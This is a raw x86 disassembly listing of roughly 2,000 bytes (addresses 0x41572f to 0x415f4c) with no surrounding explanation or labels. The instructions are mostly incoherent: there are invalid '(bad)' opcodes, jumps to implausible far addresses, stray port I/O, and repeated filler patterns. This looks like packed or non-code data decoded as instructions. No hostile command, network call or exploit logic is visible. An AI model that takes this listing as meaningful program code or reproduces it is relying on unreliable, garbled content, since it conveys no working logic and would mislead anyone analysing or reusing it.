  41572f:	push   esi
  415730:	jmp    0x415767
  415732:	or     eax,0x1b54115d
  415737:	or     ebp,DWORD PTR gs:[edi-0x19]
  41573b:	push   eax
  41573c:	add    DWORD PTR [edx+0x15],ebp
  41573f:	jae    0x415734
  415741:	popa   
  415742:	or     ebx,DWORD PTR [eax-0xa]
  415745:	push   esi
  415746:	stc    
  415747:	pop    esp
  415748:	leave  
  415749:	addr16 out 0x3f,eax
  41574c:	enter  0xd753,0x57
  415750:	call   0xcca604ae
  415755:	gs out 0x47,eax
  415758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415759:	add    ah,bh
  41575b:	add    esp,DWORD PTR [edi-0x58fc18fe]
  415761:	imul   eax,esp,0x71
  415764:	xchg   ecx,eax
  415765:	gs ret 
  415767:	xor    dl,ch
  415769:	xor    bl,al
  41576b:	push   edi
  41576c:	add    DWORD PTR [edx],0xffffffbe
  41576f:	dec    edi
  415770:	jbe    0x4157b9
  415772:	test   BYTE PTR [edi-0x40],ch
  415775:	arpl   WORD PTR [ebx-0x559a8ea4],bx
  41577b:	push   esi
	...
  415790:	add    BYTE PTR [ecx-0x7ba869ad],al
  415796:	xor    eax,DWORD PTR [edx+esi*2+0x55866956]
  41579d:	pusha  
  41579e:	out    0x53,ax
  4157a1:	push   ebp
  4157a2:	outs   dx,DWORD PTR ds:[esi]
  4157a3:	dec    edx
  4157a4:	pop    edi
  4157a5:	push   esi
  4157a6:	push   ebx
  4157a7:	xor    BYTE PTR [eax+0x5b],ah
  4157aa:	outs   dx,DWORD PTR ds:[esi]
  4157ab:	cmp    bl,BYTE PTR [edi+0x36]
  4157ae:	push   ebx
  4157af:	inc    eax
  4157b0:	push   ebp
  4157b1:	inc    ecx
  4157b2:	dec    ecx
  4157b3:	dec    ebx
  4157b4:	add    al,0xa7
  4157b6:	add    ah,bh
  4157b8:	add    esp,DWORD PTR [edi-0x5b16fffe]
  4157be:	add    ah,BYTE PTR [ecx+0x3b]
  4157c1:	cld    
  4157c2:	push   edx
  4157c3:	je     0x41579f
  4157c5:	(bad)  
  4157c6:	xor    BYTE PTR [ebp+ecx*1-0x21],ah
  4157ca:	add    al,BYTE PTR [ecx+0x1b]
  4157cd:	or     al,0x53
  4157cf:	je     0x415805
  4157d1:	fst    DWORD PTR [edx+0x72]
  4157d4:	push   ss
  4157d5:	mul    DWORD PTR [ebx+0x61]
  4157d8:	cmc    
  4157d9:	mov    al,ds:0xa308743f
  4157de:	add    al,BYTE PTR [eax]
  4157e0:	jmp    0xe1a48889
  4157e5:	jmp    0xe30fa8ec
  4157ea:	push   esi
  4157eb:	jne    0x4157b5
  4157ed:	mov    dh,0x63
  4157ef:	pop    esp
  4157f0:	mov    dh,0xcd
  4157f2:	jo     0x415846
  4157f4:	test   al,0x0
	...
  41580a:	(bad)  
  41580b:	add    ch,BYTE PTR [ebp-0x47]
  41580e:	xor    DWORD PTR [eax+0x0],0x8002a4e8
  415815:	mov    edx,0x956c636c
  41581a:	xlat   BYTE PTR ds:[ebx]
  41581b:	adc    al,0x2e
  41581d:	test   DWORD PTR [eax+0x6e],ebx
  415820:	add    BYTE PTR [edx-0x6a9cba44],bh
  415826:	mov    dl,0x6d
  415828:	ins    BYTE PTR es:[edi],dx
  415829:	lea    ecx,[ecx+0x54]
  41582c:	push   eax
  41582d:	mov    BYTE PTR [eax+0x6a],dl
  415830:	aas    
  415831:	jmp    0xe9415ada
  415836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415837:	shl    BYTE PTR [edi],1
  415839:	sub    BYTE PTR [ebx-0x54d7d81f],ah
  41583f:	shl    DWORD PTR [edi],1
  415841:	sub    BYTE PTR [ebx-0x54d7d5f9],ah
  415847:	cmc    
  415848:	sub    DWORD PTR [eax],eax
  41584a:	jg     0x415852
  41584c:	and    ebp,DWORD PTR [edx]
  41584e:	iret   
  41584f:	push   es
  415850:	xor    ebp,DWORD PTR [edx]
  415852:	iret   
  415853:	push   es
  415854:	dec    esp
  415855:	sub    bh,BYTE PTR [edi-0x40d5a0fa]
  41585b:	push   es
  41585c:	jae    0x415888
  41585e:	iret   
  41585f:	push   es
  415860:	nop
  415861:	sub    cl,bh
  415863:	push   es
  415864:	mov    ah,0x2a
  415866:	mov    edi,0xbf2acd06
  41586b:	push   es
	...
  415880:	add    BYTE PTR [eax],al
  415882:	add    BYTE PTR [esi+0x2],cl
  415885:	std    
  415886:	dec    DWORD PTR [esi-0x7e]
  415889:	add    DWORD PTR [eax],eax
  41588b:	add    cl,BYTE PTR ds:[ecx+0x79]
  41588f:	sahf   
  415890:	inc    edx
  415891:	imul   esp,DWORD PTR [ebx+0x5b],0x35
  415895:	popa   
  415896:	outs   dx,BYTE PTR ds:[esi]
  415897:	pop    edx
  415898:	push   ebx
  415899:	add    BYTE PTR [ecx],al
  41589b:	add    al,BYTE PTR ds:[eax+0x23e1a]
  4158a2:	inc    ecx
  4158a3:	pop    esi
  4158a4:	push   edx
  4158a5:	inc    esp
  4158a6:	popa   
  4158a7:	pop    edx
  4158a8:	popa   
  4158a9:	add    BYTE PTR [ecx],al
  4158ab:	inc    BYTE PTR [ecx]
  4158ad:	sbb    BYTE PTR [esi+edi*8],0x1
  4158b1:	add    BYTE PTR [ecx+esi*1+0x63],cl
  4158b5:	pop    ebp
  4158b6:	ins    BYTE PTR es:[edi],dx
  4158b7:	out    dx,al
  4158b8:	inc    eax
  4158b9:	jo     0x41592b
  4158bb:	dec    edx
  4158bc:	popa   
  4158bd:	je     0x415920
  4158bf:	inc    BYTE PTR [eax]
  4158c1:	add    BYTE PTR [eax],al
  4158c3:	dec    esi
  4158c4:	and    DWORD PTR [eax],eax
  4158c6:	add    dh,cl
  4158c8:	inc    edx
  4158c9:	pop    ebp
  4158ca:	arpl   WORD PTR [esi],sp
  4158cc:	cmp    eax,0x1be0100
  4158d1:	and    BYTE PTR [ecx],0xce
  4158d4:	add    DWORD PTR [eax],eax
  4158d6:	inc    ebx
  4158d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d8:	inc    esp
  4158d9:	jno    0x415944
  4158db:	ds inc esi
  4158dd:	push   ebp
  4158de:	add    BYTE PTR [esi-0x3a7ffe15],ah
  4158e4:	jmp    0x4158e7
	...
  4158fa:	add    BYTE PTR [eax],al
  4158fc:	out    dx,eax
  4158fd:	inc    edx
  4158fe:	push   ebp
  4158ff:	je     0x415901
  415901:	sbb    bl,BYTE PTR [ebx+0x0]
  415904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415905:	jmp    0x415908
  415907:	sub    BYTE PTR [edx-0x15fffe15],0xf2
  41590e:	and    eax,DWORD PTR [eax+eax*1+0x9]
  415912:	push   edi
  415913:	imul   eax,DWORD PTR [edx],0xfffffff6
  415916:	push   edi
  415917:	jno    0x4158c0
  415919:	jmp    0xc868591f
  41591e:	add    DWORD PTR [eax],eax
  415920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415921:	sub    BYTE PTR [ecx+0x6b],dh
  415924:	mov    edx,0xe6206fb4
  415929:	mov    ebx,0xbfc64451
  41592e:	add    BYTE PTR fs:[esi-0x7f7ffe15],ah
  415935:	jmp    0x415938
  415937:	add    BYTE PTR [edx-0x3e],dh
  41593a:	and    DWORD PTR [eax-0x72],edx
  41593d:	enter  0x7355,0x95
  415941:	(bad)  
  415942:	push   esi
  415943:	add    BYTE PTR [ebp-0x2e7ffe15],ah
  415949:	jmp    0x41594c
  41594b:	add    BYTE PTR [esp+eax*4+0x70],ah
  41594f:	imul   eax,DWORD PTR [eax+0x7844215d],0xffffff88
  415956:	pop    eax
  415957:	imul   ecx,DWORD PTR [edx-0x73],0x55
  41595b:	jno    0x415904
  41595d:	jmp    0x415963
	...
  415972:	add    BYTE PTR [eax],al
  415974:	add    BYTE PTR [edi],ah
  415976:	pushf  
  415977:	add    DWORD PTR [eax],eax
  415979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41597a:	add    ch,BYTE PTR [edx]
  41597c:	jae    0x4159ca
  41597e:	outs   dx,DWORD PTR ds:[esi]
  41597f:	dec    esi
  415980:	jb     0x415909
  415982:	inc    ebx
  415983:	dec    ebx
  415984:	jno    0x4159ce
  415986:	ins    BYTE PTR es:[edi],dx
  415987:	inc    eax
  415988:	push   edi
  415989:	xor    edx,DWORD PTR [eax+0x48]
  41598c:	pop    eax
  41598d:	or     BYTE PTR [ebp+0x44],dl
  415990:	and    al,0xf3
  415992:	imul   eax,DWORD PTR [esi+0x70],0x16
  415996:	add    ebp,eax
  415998:	add    esp,DWORD PTR [edi-0x58fc287e]
  41599e:	add    ch,BYTE PTR [eax]
  4159a0:	push   0x6d056a0c
  4159a5:	not    BYTE PTR [esi+0x19]
  4159a8:	gs repz imul edi,ebp,0xe368768
  4159b0:	jae    0x41597d
  4159b2:	dec    edi
  4159b3:	out    0x4,eax
  4159b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159b6:	add    ah,BYTE PTR [edi+0x8]
  4159b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ba:	add    ah,bh
  4159bc:	xor    eax,esp
  4159be:	push   eax
  4159bf:	fidiv  DWORD PTR [edx-0x37]
  4159c2:	popa   
  4159c3:	ret    
  4159c4:	add    edx,esi
  4159c6:	imul   eax,ebp,0x57
  4159c9:	mov    dl,0x61
  4159cb:	mov    ecx,0xd04d8368
  4159d0:	xchg   bp,ax
  4159d2:	imul   edi,DWORD PTR [edx-0x74a9768e],0x3a
	...
  4159ed:	add    BYTE PTR [eax+0x7a728b6c],al
  4159f3:	dec    edi
  4159f4:	mov    ebx,0x99507446
  4159f9:	push   0x68b55681
  4159fe:	jne    0x415a4f
  415a00:	nop
  415a01:	jb     0x415a54
  415a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a05:	pop    ebx
  415a06:	push   edi
  415a07:	outs   dx,BYTE PTR ds:[esi]
  415a08:	add    BYTE PTR [esi-0x728da086],al
  415a0e:	xchg   ecx,eax
  415a0f:	push   0x63
  415a11:	push   ebp
  415a12:	aaa    
  415a13:	and    al,BYTE PTR [esi+0x4e]
  415a16:	aaa    
  415a17:	data16 arpl WORD PTR [ebx+0x5a],bx
  415a1b:	add    dl,BYTE PTR [eax+0x1e]
  415a1e:	jb     0x415a56
  415a20:	and    BYTE PTR [edx+edi*8],cl
  415a23:	and    cl,BYTE PTR [eax+0x15]
  415a26:	fbstp  TBYTE PTR [edx]
  415a28:	sub    eax,0xb12d6f8
  415a2d:	jecxz  0x415a0b
  415a2f:	ins    DWORD PTR es:[edi],dx
  415a30:	jno    0x415a4f
  415a32:	mov    eax,ds:0xa81a2322
  415a37:	or     BYTE PTR [edi],bh
  415a39:	or     cl,BYTE PTR [edx]
  415a3b:	pusha  
  415a3c:	jo     0x415a53
  415a3e:	mov    DWORD PTR [edx],esp
  415a40:	sub    dl,dh
  415a42:	xchg   edx,eax
  415a43:	pop    es
  415a44:	or     ch,BYTE PTR [eax]
  415a46:	ret    0x6361
  415a49:	stc    
  415a4a:	clc    
  415a4b:	daa    
  415a4c:	inc    ebx
  415a4d:	inc    ebx
  415a4f:	ins    DWORD PTR es:[edi],dx
  415a50:	rol    BYTE PTR fs:[eax],1
	...
  415a67:	mov    dh,0x65
  415a69:	cmp    cl,BYTE PTR [ecx]
  415a6b:	int3   
  415a6c:	data16 arpl di,ax
  415a6f:	fsub   DWORD PTR [ebx+0x74]
  415a72:	sar    BYTE PTR [eax+0x22],1
  415a75:	sub    al,BYTE PTR [edx]
  415a77:	je     0x415a90
  415a79:	xor    ah,ch
  415a7b:	stos   BYTE PTR es:[edi],al
  415a7c:	inc    ecx
  415a7d:	ins    DWORD PTR es:[edi],dx
  415a7e:	(bad)  
  415a7f:	js     0x415ae0
  415a81:	outs   dx,BYTE PTR ds:[esi]
  415a82:	mov    ch,0xb9
  415a84:	dec    esi
  415a85:	arpl   WORD PTR [edi-0x1c97a971],dx
  415a8b:	les    ebx,FWORD PTR [edi]
  415a8d:	ins    BYTE PTR es:[edi],dx
  415a8e:	pushf  
  415a8f:	mov    eax,ds:0x767e4108
  415a94:	ins    BYTE PTR es:[edi],dx
  415a95:	arpl   WORD PTR [eax],ax
  415a97:	sub    eax,0x286f6533
  415a9c:	std    
  415a9d:	pop    ds
  415a9e:	arpl   WORD PTR [edx],bp
  415aa0:	push   edx
  415aa1:	outs   dx,DWORD PTR ds:[esi]
  415aa2:	gs jmp 0x415ab1
  415aa5:	aas    
  415aa6:	outs   dx,DWORD PTR ds:[esi]
  415aa7:	pop    eax
  415aa8:	cmp    ah,BYTE PTR [ecx+0x6e]
  415aab:	push   edx
  415aac:	sub    edx,DWORD PTR [ecx+edi*2+0x4e]
  415ab0:	arpl   WORD PTR [edx],di
  415ab2:	and    BYTE PTR [edi+0x36],bl
  415ab5:	jo     0x415b23
  415ab7:	neg    DWORD PTR [edi+0x5d]
  415aba:	je     0x415ab3
  415abc:	push   ebx
  415abd:	outs   dx,BYTE PTR ds:[esi]
  415abe:	das    
  415abf:	jmp    0xd2a6cf23
  415ac4:	sub    DWORD PTR [edi+0x74],ebp
  415ac7:	pushf  
  415ac8:	popa   
  415ac9:	pop    ebp
  415aca:	ins    DWORD PTR es:[edi],dx
	...
  415adf:	add    BYTE PTR [ebx-0x5790c0f8],cl
  415ae5:	cmp    ah,BYTE PTR [ecx+0x6e]
  415ae8:	xchg   edx,eax
  415ae9:	sub    DWORD PTR [ecx+0x6e],eax
  415aec:	lods   eax,DWORD PTR ds:[esi]
  415aed:	push   ebx
  415aee:	imul   ebp,DWORD PTR fs:[eax-0x63dfc595],0x4c616e6d
  415af9:	cmp    eax,0x2f030a09
  415afe:	popa   
  415aff:	jb     0x415aac
  415b01:	inc    ebp
  415b02:	arpl   WORD PTR [ebp+0x68],sp
  415b05:	xor    bh,BYTE PTR [edx]
  415b07:	and    BYTE PTR [ebx],cl
  415b09:	push   ebx
  415b0a:	jp     0x415b75
  415b0c:	cli    
  415b0d:	imul   ebx,DWORD PTR [ebp+0x2f],0x20301412
  415b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b15:	pop    edi
  415b16:	imul   ebp,DWORD PTR [ebp+0x4e],0x65
  415b1a:	je     0x415b85
  415b1c:	sub    al,0x6a
  415b1e:	popa   
  415b1f:	cmp    ebp,esi
  415b21:	dec    eax
  415b22:	dec    edi
  415b23:	dec    ecx
  415b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b26:	and    DWORD PTR [ebx],esi
  415b28:	mov    ecx,0x78201cbb
  415b2d:	jb     0x415b9e
  415b2f:	fs dec eax
  415b31:	push   eax
  415b32:	push   esp
  415b33:	and    BYTE PTR [esi-0x62f4d56d],cl
  415b39:	mov    dh,0xb
  415b3b:	add    BYTE PTR [eax+esi*1+0x6e],ah
  415b3f:	je     0x415b83
  415b41:	dec    ecx
  415b42:	pop    eax
  415b43:	sub    eax,DWORD PTR [eax]
	...
  415b59:	arpl   WORD PTR [esi+0x6e],ax
  415b5c:	xor    eax,DWORD PTR gs:[ebx+0x1a]
  415b60:	add    bl,dh
  415b62:	xor    BYTE PTR [ecx+0x5f],ah
  415b65:	adc    esi,DWORD PTR [ebx]
  415b67:	ins    DWORD PTR es:[edi],dx
  415b68:	outs   dx,BYTE PTR ds:[esi]
  415b69:	int    0xeb
  415b6b:	inc    esi
  415b6c:	inc    ebx
  415b6d:	repz or esp,DWORD PTR [edi]
  415b70:	jno    0x415b39
  415b72:	adc    edi,DWORD PTR [eax]
  415b74:	push   esp
  415b75:	xlat   BYTE PTR ds:[ebx]
  415b76:	enter  0x2e14,0xb7
  415b7a:	fiadd  WORD PTR [edi]
  415b7c:	dec    eax
  415b7d:	clc    
  415b7e:	cld    
  415b7f:	push   edi
  415b80:	cmp    al,BYTE PTR [edi-0x52f4ad3a]
  415b86:	sub    ah,BYTE PTR [ecx+0x61]
  415b89:	retf   0x55db
  415b8c:	cmp    al,BYTE PTR [edi-0x4dd5d13b]
  415b92:	aad    0x44
  415b94:	popa   
  415b95:	les    edi,FWORD PTR [esi-0x597d8baf]
  415b9b:	imul   esp,DWORD PTR [ecx-0x48],0xffffffbf
  415b9f:	ins    BYTE PTR es:[edi],dx
  415ba0:	outs   dx,BYTE PTR ds:[esi]
  415ba1:	mov    BYTE PTR ds:0xbe836724,al
  415ba7:	imul   esi,DWORD PTR [esi+edi*2-0x69],0x5c
  415bac:	sub    al,0xc7
  415bae:	add    eax,0x2c26f19
  415bb3:	xlat   BYTE PTR ds:[ebx]
  415bb4:	adc    BYTE PTR [ebp-0x7e9271bb],ch
  415bba:	pop    edi
  415bbb:	mov    dl,BYTE PTR [edi+0x0]
	...
  415bd2:	sub    BYTE PTR [ecx+0x7d],0x19
  415bd6:	xchg   DWORD PTR [ebp-0x6d],esp
  415bd9:	outs   dx,BYTE PTR ds:[esi]
  415bda:	push   esi
  415bdb:	pop    edi
  415bdc:	in     al,dx
  415bdd:	or     DWORD PTR [ebp+edx*2-0x74],esi
  415be1:	push   ecx
  415be2:	jl     0x415c27
  415be4:	xchg   BYTE PTR [eax+0x51],ch
  415be7:	dec    esi
  415be8:	and    DWORD PTR [esp+ebp*2],esp
  415beb:	imul   esp,DWORD PTR [ecx+0x6d],0x2f486643
  415bf2:	jae    0x415c1c
  415bf4:	pop    ss
  415bf5:	and    al,0xcf
  415bf7:	arpl   WORD PTR [esi+0x71],dx
  415bfa:	pop    ss
  415bfb:	bound  esi,QWORD PTR [ebx]
  415bfd:	ins    DWORD PTR es:[edi],dx
  415bfe:	add    eax,0xc71b4c67
  415c03:	inc    ebp
  415c04:	sbb    cl,BYTE PTR [ebp-0x1c]
  415c07:	and    bl,ah
  415c09:	sub    eax,0x36c71bb7
  415c0e:	or     BYTE PTR [ecx+0xb],ch
  415c11:	outs   dx,DWORD PTR ds:[esi]
  415c12:	repnz push ebx
  415c14:	(bad)  
  415c15:	sbb    al,0x9f
  415c17:	sub    esp,esi
  415c19:	or     DWORD PTR [esp+ecx*1+0x28a72de7],ebp
  415c20:	lds    eax,FWORD PTR [ebx]
  415c22:	jmp    0x415c50
  415c24:	mov    ebp,0x152ca729
  415c29:	sub    ah,BYTE PTR [edi-0x2fa83b98]
  415c2f:	push   edx
  415c30:	rcl    BYTE PTR [edx],0x75
  415c33:	sub    bl,al
  415c35:	outs   dx,DWORD PTR ds:[esi]
	...
  415c4a:	add    BYTE PTR [ebx-0x6c974afe],dl
  415c50:	inc    ecx
  415c51:	mov    bh,0x6c
  415c53:	gs dec ebp
  415c55:	add    bh,cl
  415c57:	and    BYTE PTR [ebx+0x72],0xa7
  415c5b:	push   esi
  415c5c:	arpl   WORD PTR [ebx-0x17],sp
  415c5f:	push   0x63
  415c61:	je     0x415c17
  415c63:	push   ebp
  415c64:	arpl   WORD PTR [edx-0x54],si
  415c67:	jp     0x415cbc
  415c69:	imul   ebp,ecx,0xffffffa4
  415c6c:	gs ins BYTE PTR es:[edi],dx
  415c6e:	mov    WORD PTR [ebp+0x40852e14],?
  415c74:	data16 add BYTE PTR [edx+0x794d5d70],bl
  415c7b:	dec    edi
  415c7c:	push   0x544a5d51
  415c81:	pop    edi
  415c82:	inc    esi
  415c83:	dec    eax
  415c84:	add    al,BYTE PTR [eax]
  415c86:	dec    eax
  415c87:	aas    
  415c88:	push   eax
  415c89:	pop    edi
  415c8a:	pop    ecx
  415c8b:	or     al,0x12
  415c8d:	xor    dl,BYTE PTR [edi]
  415c8f:	packuswb mm5,QWORD PTR [ecx+ebp*8-0x1b]
  415c94:	data16 ins BYTE PTR es:[edi],dx
  415c96:	inc    esi
  415c97:	push   es
  415c98:	cmp    BYTE PTR [esp+eax*2-0x1c],dh
  415c9c:	push   0x60093064
  415ca1:	je     0x415cb3
  415ca3:	add    al,0x67
  415ca5:	adc    eax,DWORD PTR [bx+si]
  415ca8:	xor    ah,BYTE PTR [edi+0x5]
  415cab:	stos   DWORD PTR es:[edi],eax
  415cac:	inc    ecx
  415cad:	push   0xc
	...
  415cc2:	add    BYTE PTR [eax],al
  415cc4:	(bad)  
  415cc5:	imul   edx,DWORD PTR [esi+ecx*1-0x42],0xc0246e63
  415ccd:	imul   esp,DWORD PTR [edx+0x4],0xffffffd5
  415cd1:	push   ecx
  415cd2:	push   0x4602d4d0
  415cd7:	fcmovne st,st(1)
  415cd9:	arpl   WORD PTR [ecx-0x40],dx
  415cdc:	rol    BYTE PTR [edx],0x41
  415cdf:	fisttp DWORD PTR [ecx-0xfffbca2]
  415ce5:	das    
  415ce6:	imul   esp,DWORD PTR [ebp+0x4c],0x3f657464
  415ced:	add    edi,DWORD PTR [edi]
  415cef:	jb     0x415cdc
  415cf1:	pop    esi
  415cf2:	inc    esi
  415cf3:	jb     0x415d20
  415cf5:	pusha  
  415cf6:	add    BYTE PTR [ebx+0xc],al
  415cf9:	cmp    al,0x70
  415cfb:	je     0x415d36
  415cfd:	pusha  
  415cfe:	je     0x415d55
  415d00:	cmp    eax,0x2b4b7260
  415d05:	cmp    al,0x0
  415d07:	inc    ebx
  415d08:	dec    esp
  415d09:	cmp    al,0x70
  415d0b:	je     0x415d08
  415d0d:	cmp    dh,BYTE PTR [eax+0x6f]
  415d10:	cmp    al,0x2f
  415d12:	inc    edi
  415d13:	gs inc edi
  415d15:	(bad)  
  415d16:	ds jb  0x415d60
  415d19:	cs je  0x415d60
  415d1c:	pop    ebx
  415d1d:	xor    DWORD PTR [edx+esi*2-0x1f],esi
  415d21:	cmp    DWORD PTR [edi+0x65],eax
  415d24:	out    0xfe,eax
  415d26:	ds jb  0x415d29
	...
  415d3d:	out    0x2e,eax
  415d3f:	je     0x415d93
  415d41:	fist   DWORD PTR [edx+0x61]
  415d44:	popa   
  415d45:	mov    ebp,0x906f3f5d
  415d4a:	cmp    ah,BYTE PTR [ecx+0x78]
  415d4d:	call   0x725d:0x886551fe
  415d54:	je     0x415cf0
  415d56:	addr16 dec edi
  415d58:	gs mov dl,0x5c
  415d5b:	add    BYTE PTR [edi+0x4e],cl
  415d5e:	pop    ebp
  415d5f:	outs   dx,BYTE PTR ds:[esi]
  415d60:	push   eax
  415d61:	dec    esp
  415d62:	addr16 pop edi
  415d64:	gs cmp eax,0x556f5433
  415d6a:	pop    ebp
  415d6b:	outs   dx,BYTE PTR ds:[esi]
  415d6c:	add    bh,dh
  415d6e:	fs jo  0x415dd6
  415d71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d72:	mov    ecx,0xca916d50
  415d77:	push   ebp
  415d78:	arpl   WORD PTR [ebx-0x54],bp
  415d7b:	fs mov bh,BYTE PTR gs:[edi-0x678d91b4]
  415d83:	data16 jb 0x415d2d
  415d86:	pushf  
  415d87:	data16 je 0x415ddd
  415d8a:	ins    BYTE PTR es:[edi],dx
  415d8b:	push   0x6b928163
  415d90:	data16 js 0x415e0c
  415d93:	outs   dx,BYTE PTR ds:[esi]
  415d94:	pop    edi
  415d95:	pop    ebx
  415d96:	sub    BYTE PTR [esi+ebp*2-0x59],0xa8
  415d9b:	ins    BYTE PTR es:[edi],dx
  415d9c:	outs   dx,BYTE PTR ds:[esi]
  415d9d:	pop    ecx
  415d9e:	jle    0x415def
  415da0:	je     0x415da2
	...
  415db6:	je     0x415d3a
  415db8:	gs push esp
  415dba:	push   eax
  415dbb:	js     0x415e12
  415dbd:	jb     0x415e0d
  415dbf:	sub    eax,0x3f3e5161
  415dc4:	inc    ebx
  415dc5:	add    BYTE PTR [ebx+0x3c],bl
  415dc8:	popa   
  415dc9:	ins    DWORD PTR es:[edi],dx
  415dca:	adc    DWORD PTR [edi],ecx
  415dcc:	push   ebp
  415dcd:	arpl   WORD PTR ds:0x4c042b,dx
  415dd3:	inc    ebp
  415dd4:	ins    DWORD PTR es:[edi],dx
  415dd5:	jae    0x415dee
  415dd7:	cld    
  415dd8:	push   ebp
  415dd9:	addr16 stc 
  415ddb:	inc    edx
  415ddc:	push   0x32070063
  415de1:	pop    edi
  415de2:	add    ebp,edi
  415de4:	pop    esi
  415de5:	aas    
  415de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de7:	sub    ah,BYTE PTR [eax+0x6a]
  415dea:	(bad)  
  415dec:	dec    edi
  415ded:	push   esp
  415dee:	enter  0x5ef0,0x6e
  415df2:	neg    ecx
  415df4:	ins    BYTE PTR es:[edi],dx
  415df5:	jbe    0x415db5
  415df7:	call   FWORD PTR [esi+0x65]
  415dfa:	retf   0x1d8
  415dfd:	add    ah,al
  415dff:	add    bl,cl
  415e01:	pop    esp
  415e02:	mov    bh,0x4e
  415e04:	sbb    dl,BYTE PTR [esi]
  415e06:	jns    0x415e66
  415e08:	ret    
  415e09:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  415e0b:	inc    ecx
  415e0c:	les    edx,FWORD PTR [ebp-0x6d]
  415e0f:	inc    ebp
  415e10:	mov    bh,0x60
  415e12:	xor    DWORD PTR [ecx],0x5f9356c0
  415e18:	les    esi,FWORD PTR [esi]
	...
  415e2e:	add    BYTE PTR [ebx+0x65],bh
  415e31:	mov    ecx,0xaa02b860
  415e36:	pusha  
  415e37:	jne    0x415e87
  415e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e3a:	imul   esi,DWORD PTR [edi+eiz*2-0x56],0x804e5560
  415e42:	popa   
  415e43:	inc    eax
  415e44:	popa   
  415e45:	mov    BYTE PTR [edi+0x44],cl
  415e48:	push   ecx
  415e49:	mov    al,0x69
  415e4b:	jbe    0x415e9b
  415e4d:	xchg   BYTE PTR [ebp+0x44],dl
  415e50:	add    ch,BYTE PTR [edx+0x2a4e3560]
  415e56:	push   0x37445142
  415e5b:	xor    esp,DWORD PTR [ebp+0x59]
  415e5e:	popa   
  415e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e60:	aas    
  415e61:	pop    ecx
  415e62:	pop    ebp
  415e63:	pop    ss
  415e64:	dec    edi
  415e65:	sub    BYTE PTR [edi+0x0],ah
  415e68:	dec    esi
  415e69:	push   eax
  415e6a:	push   esi
  415e6b:	add    al,0x40
  415e6d:	dec    esp
  415e6e:	push   esi
  415e6f:	sti    
  415e70:	imul   eax,DWORD PTR [ebp+0x6d],0x611b6206
  415e77:	xlat   BYTE PTR ds:[ebx]
  415e78:	push   eax
  415e79:	adc    BYTE PTR [edx-0x38],dl
  415e7c:	dec    esi
  415e7d:	or     al,0x4f
  415e7f:	les    ebx,FWORD PTR [ecx-0x19]
  415e82:	add    esp,DWORD PTR [edi-0x58fc18fe]
  415e88:	add    ah,bh
  415e8a:	add    esp,DWORD PTR [edi-0x5b16fffe]
  415e90:	add    al,BYTE PTR [eax]
  415e92:	jmp    0x415e97
	...
  415ea7:	add    BYTE PTR [edx+eax*1+0x2a4e900],ah
  415eae:	add    cl,ch
  415eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eb1:	add    al,BYTE PTR [eax]
  415eb3:	jmp    0xe941615c
  415eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eb9:	add    al,BYTE PTR [eax]
  415ebb:	jmp    0xe9416164
  415ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ec1:	add    al,BYTE PTR [eax]
  415ec3:	jmp    0xe941616c
  415ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ec9:	add    al,BYTE PTR [eax]
  415ecb:	jmp    0xe9416174
  415ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed1:	add    al,BYTE PTR [eax]
  415ed3:	jmp    0xe941617c
  415ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed9:	add    al,BYTE PTR [eax]
  415edb:	jmp    0xe9416184
  415ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee1:	add    al,BYTE PTR [eax]
  415ee3:	jmp    0xe941618c
  415ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee9:	add    al,BYTE PTR [eax]
  415eeb:	jmp    0xe9416194
  415ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef1:	add    al,BYTE PTR [eax]
  415ef3:	jmp    0xe941619c
  415ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef9:	dec    edx
  415efa:	push   ebp
  415efb:	xor    bh,ah
  415efd:	add    bh,BYTE PTR [ecx+0x4]
  415f00:	mov    bl,0x1a
  415f02:	pop    eax
  415f03:	add    al,0xa0
  415f05:	adc    dh,BYTE PTR [ecx+edx*1]
  415f08:	rcr    BYTE PTR [edi],0x30
  415f0b:	fld    QWORD PTR [eax]
	...
  415f21:	lods   al,BYTE PTR ds:[esi]
  415f22:	daa    
  415f23:	and    ebx,ecx
  415f25:	xchg   edx,eax
  415f26:	cmp    ah,BYTE PTR [ebx]
  415f28:	fnstcw WORD PTR [edx-0x4b3bd4c6]
  415f2e:	adc    BYTE PTR [eax+0x0],bl
  415f31:	arpl   di,bp
  415f33:	xor    DWORD PTR [eax+0x63],ebx
  415f36:	out    dx,eax
  415f37:	xor    DWORD PTR [eax+0x73],ebx
  415f3a:	out    dx,eax
  415f3b:	xor    DWORD PTR [eax+0x63],ebx
  415f3e:	out    dx,eax
  415f3f:	xor    DWORD PTR [eax-0x5d],ebx
  415f42:	out    dx,al
  415f43:	xor    DWORD PTR [eax+0x4b],ebx
  415f46:	inc    DWORD PTR [edx+0x65]
  415f49:	add    cl,BYTE PTR [ecx+0x5d]
  415f4c:	je     0x415f35
